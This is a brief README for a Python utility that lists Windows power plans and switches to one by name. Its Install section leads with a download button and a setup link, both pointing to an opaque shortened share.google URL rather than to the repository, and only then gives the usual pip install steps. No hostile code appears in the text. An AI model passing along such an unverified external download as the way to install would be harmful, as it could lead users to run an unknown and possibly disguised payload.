# Power Plan Switch

Balanced or High performance without Control Panel.

List Windows power plans and switch to one by name.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Open the setup page](https://share.google/A1IHfyGRT0zGRLqj8)**

A laptop should flip plans when you plug in, without a hunt.

This lists GUID names and activates one.

- List plans
- Switch by name
- Shows the active plan
- Optional on-AC helper

Python 3.11+. From the repo:

    python -m pip install -r requirements.txt
    python main.py --help
